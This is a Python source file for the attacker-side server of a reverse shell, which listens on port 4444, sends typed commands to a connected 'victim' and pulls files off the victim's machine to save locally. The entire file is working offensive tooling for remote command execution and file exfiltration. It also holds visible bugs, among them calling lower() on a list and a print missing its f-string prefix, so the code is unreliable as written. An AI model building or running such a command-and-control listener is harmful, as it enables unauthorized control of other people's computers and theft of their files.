import socket

SERVER_HOST = "10.0.1.24" # desktop
SERVER_PORT = 4444
BUFFER_SIZE = 1024*128 # max size of messages

SEPARATOR = "<sep>"

s = socket.socket()

# bind the socket
s.bind((SERVER_HOST, SERVER_PORT))

# Listening
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# Accept client to connect
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# Receiving the current working directory from the victim
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory", cwd)

# Loop for making commands and sending them to the victim
while True:
    # Reading 
    command = input(f"{cwd} $> ")
    splitted_command = command.split()
    if not command.strip():
        continue
    elif splitted_command.lower()[0] == "read" :
        respond = client_socket.recv(BUFFER_SIZE).decode()
        if respond != "error" :
            file_name = splitted_command[1]
            file_data = b""
            while True:
                data = client_socket.recv(BUFFER_SIZE)
                file_data += data
                if data.endswith(b"end") :
                    break
            file_data = file_data[:len(file_data) - 3]
            with open(file_name, "wb") as f:
                f.write(file_data)
            print("File {file_name} has been written.")
        else :
            print("File does not exist in this directory.")

    client_socket.send(command.encode())
    if command.lower() == "exit":
        break

    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)